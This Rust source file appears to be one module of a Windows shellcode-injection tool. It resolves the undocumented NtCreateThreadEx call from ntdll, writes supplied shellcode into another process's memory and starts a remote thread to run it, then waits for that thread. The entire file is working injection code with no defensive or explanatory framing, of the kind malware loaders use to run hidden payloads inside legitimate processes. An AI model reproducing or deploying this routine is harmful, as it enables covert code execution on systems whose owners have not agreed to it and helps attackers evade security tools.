use std::{ffi::{c_void}, ptr, time::Duration};

use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{Foundation::{NTSTATUS}, System::Threading::{THREAD_ALL_ACCESS}}};

use crate::wrappers::{
    HandleWrapper as _, RemoteAllocator, RemoteModule, RemoteProcess, RemoteThread
};

use super::ExecutionMethod;

pub type NtCreateThreadEx = unsafe extern "system" fn(
    thread_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    process_handle: *mut c_void,
    start_routine: *mut c_void,
    argument: *mut c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: *mut c_void,
) -> NTSTATUS;

pub(super) struct NtCreateThreadExExecutor;

impl ExecutionMethod for NtCreateThreadExExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let ntdll = RemoteModule::new("ntdll.dll")?;
        let address = ntdll.get_func_addr("NtCreateThreadEx")?;
        let create_thread_ex_func = unsafe { core::mem::transmute::<*mut core::ffi::c_void, NtCreateThreadEx>(address as *mut _) };

        let mut remote_thread = RemoteThread::default();
        let thread_handle_ptr = &mut remote_thread.handle_mut().0 as *mut _;

        let process_handle_ptr = remote_process.handle().0 as *mut c_void;

        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;

        let ntstatus = unsafe {
            create_thread_ex_func(
            thread_handle_ptr,
            THREAD_ALL_ACCESS.0,
            ptr::null_mut(),
            process_handle_ptr,
            shellcode_mem,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
            )
        };

        if ntstatus.0 != 0 {
            return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus.0).into());
        }

        remote_thread.wait_until_active(Duration::from_millis(u32::MAX as u64))?;
        Ok(())
    }
}